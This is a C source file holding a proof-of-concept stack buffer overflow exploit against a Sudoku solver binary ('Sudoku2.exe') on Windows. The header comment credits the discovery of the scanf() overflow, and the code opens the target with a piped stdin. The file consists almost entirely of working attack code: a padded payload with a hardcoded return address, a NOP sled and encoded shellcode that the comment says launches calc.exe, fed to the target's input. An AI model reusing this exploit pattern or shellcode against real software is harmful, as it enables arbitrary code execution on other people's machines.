/* Sudoku2.exe stack overflow exploit
   ==================================
   The Prime Minister of Singapore recently demonstrated his programming skills
   by releasing source code and a binary for a C++ application "Sudoku Solver"
   written several years ago. David Litchfield discovered a stack based buffer
   overflow in scanf() alongside many other researchers. Source code and a 32bit
   binary have been provided for the application at the following URL:

   https://t.co/5fVUGi7EqN (also on Lee Hsien Loong facebook)

   This exploit uses standard stack smashing techniques to grab EIP, land in 
   our buffer and WinExec()'s calc.exe. For great justice & the lulz. Tested
   on Win7 x64 against the Sudoku2.exe binary.

   greetingz to all .sg h4x0rz! ;-)

   -- prdelka
*/
#include "stdafx.h"
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <process.h>
#include <io.h>
#include <windows.h>

const char s[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe8\x40\xE3\x74\x90"
		 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		 "\xdb\xce\xd9\x74\x24\xf4\xb8\x2a\x06\xc3\xa2\x5b\x2b\xc9\xb1"
	 	 "\x31\x31\x43\x18\x03\x43\x18\x83\xc3\x2e\xe4\x36\x5e\xc6\x6a"
		 "\xb8\x9f\x16\x0b\x30\x7a\x27\x0b\x26\x0e\x17\xbb\x2c\x42\x9b"
		 "\x30\x60\x77\x28\x34\xad\x78\x99\xf3\x8b\xb7\x1a\xaf\xe8\xd6"
		 "\x98\xb2\x3c\x39\xa1\x7c\x31\x38\xe6\x61\xb8\x68\xbf\xee\x6f"
		 "\x9d\xb4\xbb\xb3\x16\x86\x2a\xb4\xcb\x5e\x4c\x95\x5d\xd5\x17"
		 "\x35\x5f\x3a\x2c\x7c\x47\x5f\x09\x36\xfc\xab\xe5\xc9\xd4\xe2"
		 "\x06\x65\x19\xcb\xf4\x77\x5d\xeb\xe6\x0d\x97\x08\x9a\x15\x6c"
		 "\x73\x40\x93\x77\xd3\x03\x03\x5c\xe2\xc0\xd2\x17\xe8\xad\x91"
		 "\x70\xec\x30\x75\x0b\x08\xb8\x78\xdc\x99\xfa\x5e\xf8\xc2\x59"
		 "\xfe\x59\xae\x0c\xff\xba\x11\xf0\xa5\xb1\xbf\xe5\xd7\x9b\xd5"
		 "\xf8\x6a\xa6\x9b\xfb\x74\xa9\x8b\x93\x45\x22\x44\xe3\x59\xe1"
		 "\x21\x1b\x10\xa8\x03\xb4\xfd\x38\x16\xd9\xfd\x96\x54\xe4\x7d"
		 "\x13\x24\x13\x9d\x56\x21\x5f\x19\x8a\x5b\xf0\xcc\xac\xc8\xf1"
		 "\xc4\xce\x8f\x61\x84\x3e\x2a\x02\x2f\x3f";

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;

int _tmain(int argc, _TCHAR* argv[]) {
	TCHAR szCmdline[]=TEXT("Sudoku2.exe");
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES saAttr; 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL; 
	CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
	ZeroMemory( &pi, sizeof(PROCESS_INFORMATION) );
	ZeroMemory( &si, sizeof(STARTUPINFO) );
	si.cb = sizeof(STARTUPINFO);
	si.hStdInput = g_hChildStd_IN_Rd;
	si.dwFlags |= STARTF_USESTDHANDLES;
	CreateProcess(NULL,szCmdline,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	DWORD dwWritten; 
	WriteFile(g_hChildStd_IN_Wr,s,strlen(s),&dwWritten,NULL);
	CloseHandle(g_hChildStd_IN_Wr);
    	WaitForSingleObject( pi.hProcess, INFINITE );
	return 0;
}
